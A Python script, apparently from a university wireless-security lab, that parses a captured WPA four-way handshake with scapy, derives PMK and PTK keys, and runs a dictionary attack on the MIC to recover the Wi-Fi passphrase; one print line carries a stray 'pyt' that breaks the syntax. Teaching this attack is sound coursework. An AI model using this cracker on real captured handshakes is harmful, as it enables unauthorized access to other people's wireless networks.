#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

__maintainer__  = "Adrien Barth et Lionel Burgbacher"

from scapy.all import *
from scapy.layers.dot11 import Dot11AssoReq, Dot11AssoResp
from scapy.layers.eap import *
load_contrib("wpa_eapol")
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


def catchAssociationRequest(packets):
    '''
    Cette fonction recherche une Association Request 802.11 et retourne le SSID avec les MAC AP/STA.
    '''
    for packet in packets:
        if packet.haslayer(Dot11AssoReq):
            ssid = packet.info.decode('UTF-8')
            ap_mac = a2b_hex(packet.addr1.replace(':', ''))
            sta_mac = a2b_hex(packet.addr2.replace(':', ''))
            return ssid, ap_mac, sta_mac
    return None, None, None 

def catch4WayHandshake(ap_mac, sta_mac, packets):
    '''
    Cette fonction permet de retrouver les informations d'un 4-Way Handshake WPA.

    La contribution Scapy wpa_eapol permet d'analyser l'échange de clés WPA.
    https://scapy.readthedocs.io/en/latest/api/scapy.contrib.wpa_eapol.html

    Le champs 'key_info' permet de savoir 
    - EAPOL-Key1 (ANonce)     = 138     AP -> STA
    - EAPOL-Key2 (SNonce+MIC) = 266     STA -> AP
    - EAPOL-Key3 (GTK+MIC)    = 5066    AP -> STA
    - EAPOL-Key4 (ACK)        = 778     STA -> AP

    L'algorithme de hash pour le calcul du MIC est donné par le champs descriptor_type:
    - 1 = HMAC-MD5-MIC
    - 2 = HMAC-SHA1-MIC (le MIC sera tronqué sur 32 bits)
    '''

    EAPOL_ANONCE = 138	    # EAPOL-Key1(ANonce)
    EAPOL_SNONCE_MIC = 266	# EAPOL-Key2(SNonce+MIC)
    EAPOL_GTK_MIC = 5066	# EAPOL-Key3(GTK+MIC)
    EAPOL_ACK = 778		    # EAPOL-Key4(ACK)

    for packet in packets:
        src_mac = a2b_hex(packet.addr2.replace(':', ''))
        dst_mac = a2b_hex(packet.addr1.replace(':', ''))
       
        if packet.haslayer(WPA_key):
            wpa_key = packet.getlayer(WPA_key)
             
            # EAPOL-Key1(ANonce) / AP -> STA
            if (wpa_key.key_info == EAPOL_ANONCE) \
            and (src_mac == ap_mac) and (dst_mac == sta_mac):
                ANonce = wpa_key.nonce

            # EAPOL-Key2(SNonce+MIC) / STA -> AP
            if (wpa_key.key_info == EAPOL_SNONCE_MIC) \
            and (src_mac == sta_mac) and (dst_mac == ap_mac):
                SNonce = wpa_key.nonce
                    
            # EAPOL-Key3(GTK+MIC)/ AP -> STA
            #if (wpa_key.key_info == EAPOL_GTK_MIC) \
            #and (src_mac == ap_mac) and (dst_mac == sta_mac):
                # Nothing to do
                    
            # EAPOL-Key4(ACK) / STA -> AP
            if (wpa_key.key_info == EAPOL_ACK) \
            and (src_mac == sta_mac) and (dst_mac == ap_mac):
                mic = (b2a_hex(wpa_key.wpa_key_mic)).decode('UTF-8')
                hmac_algo = wpa_key.descriptor_type
                # Extraction du payload utilisé pour calculer le MIC
                wpa_key.wpa_key_mic = bytes(0)
                data = a2b_hex(b2a_hex(bytes(packet.getlayer(EAPOL))))

    return ANonce, SNonce, mic, hmac_algo, data

def keyDerivation(passphrase, ssid, ap_mac, sta_mac, ANonce, SNonce, data, hmac_algo):
    '''
    Calculate PMK/PTK/MIC
    '''
    
    A = "Pairwise key expansion" #this string is used in the pseudo-random function
    B = min(ap_mac,sta_mac)+max(ap_mac,sta_mac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passphrase = str.encode(passphrase)
    ssid = str.encode(ssid)
    pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    if (hmac_algo == 1):
        mic = hmac.new(ptk[0:16],data,hashlib.md5)
    elif (hmac_algo == 2):
        mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    return pmk, ptk, mic

def bruteForceMIC(ssid, APmac, Clientmac, ANonce, SNonce, data, hmac_algo, mic_to_test):
    '''
    Try to found a WPA passphrase from a 4-Way Handshake and a word list
    '''
    dico = open('liste_francais.txt', 'r')
    for line in dico.readlines():
        for word in line.split():
            pmk, ptk, mic = keyDerivation(word, ssid, APmac, Clientmac, ANonce, SNonce, data, hmac_algo)
            if (mic.hexdigest()[0:32] == mic_to_test):
                return word
    return None

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap")

ssid, APmac, Clientmac = catchAssociationRequest(wpa)
ANonce, SNonce, mic_to_test, hmac_algo, data = catch4WayHandshake(APmac, Clientmac, wpa)
passphrase = bruteForceMIC(ssid, APmac, Clientmac, ANonce, SNonce, data, hmac_algo, mic_to_test)


print ("\nValues used to derivate keys")
print ("============================")
print ("SSID:\t\t",ssid)
print ("AP Mac:\t\t",b2a_hex(APmac))
print ("Client Mac:\t",b2a_hex(Clientmac))
print ("AP Nonce:\t",b2a_hex(ANonce))
print ("Client Nonce:\t",b2a_hex(SNonce))pyt

print ("\nBrute force attack")
print ("============================")
print ("Passphrase:\t", passphrase, "\n")


